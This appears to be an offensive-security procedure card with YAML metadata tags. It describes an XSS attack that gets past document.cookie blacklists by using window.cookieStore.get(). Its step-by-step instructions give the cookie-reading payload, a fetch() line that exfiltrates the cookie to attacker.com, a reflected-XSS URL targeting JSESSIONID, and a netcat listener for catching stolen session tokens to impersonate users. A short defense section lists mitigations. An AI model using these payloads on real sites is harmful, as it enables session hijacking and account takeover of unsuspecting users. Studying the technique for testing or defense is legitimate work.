---
id: 8be5abc5-47bf-4c1b-aae8-c57e46d7982c
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.698390+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Defense Evasion]]'
  - '[[Execution]]'
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - bypass-document-cookie
  - xss
  - filter-bypass
  - javascript
commands:
  - '[[commands/Get-Cookie-Value-via-CookieStore]]'
platforms:
  - Web
  - Browser
tools: []
validated: true
---

# Bypass-Document-Cookie-Blacklist-via-XSS-with-CookieStore-Get

## Summary

This procedure demonstrates how to bypass blacklists or restrictions on accessing cookies via the standard `document.cookie` API in a Cross-Site Scripting (XSS) attack by leveraging the `window.cookieStore.get()` method. This technique allows an attacker to retrieve sensitive cookie values, such as session tokens, even when `document.cookie` is blocked or filtered, enabling theft of user credentials or session hijacking in vulnerable web applications.

## Description

Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject and execute malicious JavaScript in the context of a trusted website, potentially compromising user sessions. Many web applications implement blacklists to prevent direct access to `document.cookie` for security reasons, such as setting HttpOnly flags or client-side filters. However, the `window.cookieStore.get()` API, introduced in modern browsers (Chrome 87+, Edge, Opera), provides an alternative interface to query cookies without triggering these restrictions. This method returns a Promise resolving to cookie details and is not subject to the same blacklists as `document.cookie`.

In this procedure, the attacker exploits an XSS vulnerability to inject JavaScript that uses `cookieStore.get()` to fetch a specific cookie (e.g., a session ID) and exfiltrates it, perhaps by alerting it for manual capture or sending it to an attacker-controlled server. This is particularly effective against applications relying on client-side protections without server-side validation. The target environment is a web application with a reflected or stored XSS vulnerability, running on modern browsers supporting the Cookie Store API. Prerequisites include identifying the XSS entry point via reconnaissance and confirming the cookie name to target.

Expected outcomes include successful retrieval of the cookie value, allowing session hijacking or further privilege escalation. This technique maps to exploiting public-facing web applications through JavaScript execution.

## Requirements

1. A confirmed XSS vulnerability in the target web application (reflected, stored, or DOM-based).
2. Knowledge of the target cookie name (e.g., 'sessionID' or 'authToken') to retrieve.
3. A modern browser environment supporting the Cookie Store API (Chrome 87+, Edge 87+, Opera 73+).
4. Attacker access to inject JavaScript payloads, such as through a vulnerable input field or URL parameter.
5. Optional: A listener or logging mechanism to capture exfiltrated data (e.g., via fetch to an external server).

## Defense

Defensive measures and detection strategies:

- Implement comprehensive input validation, output encoding, and Content Security Policy (CSP) to prevent XSS injection.
- Set HttpOnly and Secure flags on sensitive cookies to block client-side access entirely.
- Use server-side session management and avoid storing sensitive data in client-accessible cookies.
- Monitor for anomalous JavaScript execution via browser developer tools or Web Application Firewalls (WAFs) that detect unusual API calls like `cookieStore.get()`.
- Regularly audit and patch web applications, disabling or polyfilling unsupported APIs if necessary.

## Objectives

1. Bypass client-side blacklists or restrictions on `document.cookie` to access sensitive cookies.
2. Retrieve specific cookie values (e.g., session tokens) via injected JavaScript in an XSS context.
3. Exfiltrate cookie data for session hijacking or credential theft.
4. Demonstrate the limitations of client-side cookie protections in modern browsers.

## Instructions

### Step 1: Identify the XSS Vulnerability and Target Cookie

**Context**: Locate an input point vulnerable to XSS (e.g., a search field or URL parameter) and determine the name of the sensitive cookie to steal. This step ensures the payload targets the correct data without alerting the user prematurely.

Inspect the application using browser developer tools to list cookies via the Network or Application tab. Note the cookie name (e.g., 'JSESSIONID'). Test the XSS vector with a simple payload like `<script>alert(1)</script>` to confirm injection.

### Step 2: Craft the Bypass Payload Using CookieStore API

**Context**: Construct the JavaScript payload that uses `window.cookieStore.get()` to fetch the cookie. This API returns a Promise with cookie details, bypassing `document.cookie` restrictions. Replace the placeholder with the actual cookie name.

**Command** ([[commands/Get-Cookie-Value-via-CookieStore]]):
```javascript
window.cookieStore.get('COOKIE_NAME').then((cookieValue) => { alert(cookieValue.value); });
```

> This command queries the cookie store for the specified cookie and alerts its value upon resolution. If the cookie exists, the alert displays the raw value (e.g., a session token). For stealth, replace `alert()` with `fetch()` to send data to an attacker server: `fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(cookieValue.value));`. Expected output is a browser alert or network request confirming the cookie value was retrieved. Verify success by checking if the alert shows the expected token.

### Step 3: Inject and Execute the Payload

**Context**: Deliver the crafted payload through the XSS vulnerability to execute it in the victim's browser context. This step triggers the cookie retrieval and exfiltration.

Encode the payload if necessary (e.g., URL-encode for GET parameters) and inject it into the vulnerable input. For example, in a reflected XSS via URL: `https://target.com/search?q=<script>window.cookieStore.get('JSESSIONID').then((cookieValue) => { alert(cookieValue.value); });</script>`. Trigger the page load or form submission to execute.

If using a stored XSS, embed in a comment or post that renders on the page. Monitor the browser console or network tab for execution.

### Step 4: Verify and Exfiltrate the Cookie

**Context**: Confirm the payload executed successfully and capture the exfiltrated data. This validates the bypass and prepares for follow-on actions like session replay.

Check for the alert popup or outgoing network request to your server. If alerting, note the value manually. For automated exfiltration, set up a listener (e.g., using netcat or a web server) to receive the data. Success is indicated by receipt of the full cookie value, which can then be used to impersonate the user.
